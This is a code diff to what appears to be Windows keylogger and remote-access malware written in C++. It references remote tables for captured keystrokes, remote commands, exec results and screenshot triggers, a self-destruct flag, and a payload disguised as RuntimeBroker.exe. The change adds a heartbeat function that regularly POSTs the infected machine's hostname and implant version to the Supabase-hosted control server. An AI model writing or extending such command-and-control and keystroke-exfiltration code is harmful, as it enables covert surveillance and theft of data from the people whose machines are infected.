@@ -34,6 +34,7 @@ ISampleGrabber : public IUnknown {
 #define SUPABASE_KEYS_PATH L"/rest/v1/keystrokes"
 #define SUPABASE_CONTROL_PATH L"/rest/v1/control"
 #define SUPABASE_EXEC_PATH L"/rest/v1/exec_results"
+#define SUPABASE_HEARTBEAT_PATH L"/rest/v1/heartbeat?on_conflict=hostname"
 #define STORAGE_VER_PATH L"/storage/v1/object/public/Netpen/version.txt"
 #define STORAGE_EXE_PATH L"/storage/v1/object/public/Netpen/RuntimeBroker.exe"
 
@@ -1204,6 +1205,12 @@ static void HandleSpeaker(const std::string& rowId) {
     LogMsg("Speaker done: " + resultUrl);
 }
 
+static void SendHeartbeat() {
+    std::string json = "{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"version\":" + std::to_string(NETPEN_VERSION) + "}";
+    std::string resp;
+    HttpRequest(L"POST", SUPABASE_HEARTBEAT_PATH, json, resp);
+}
+
 static void FetchTriggers() {
     std::string resp;
     std::wstring q = L"/rest/v1/screenshot_triggers?active=eq.true&select=keyword";
@@ -1484,6 +1491,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
                 }
             }
             if (counter % 60 == 0 && !g_selfDestructing) {
+                SendHeartbeat();
                 FetchTriggers();
                 std::string scRowId = CheckScreenshotCmd();
                 if (!scRowId.empty()) HandleScreenshot(scRowId);
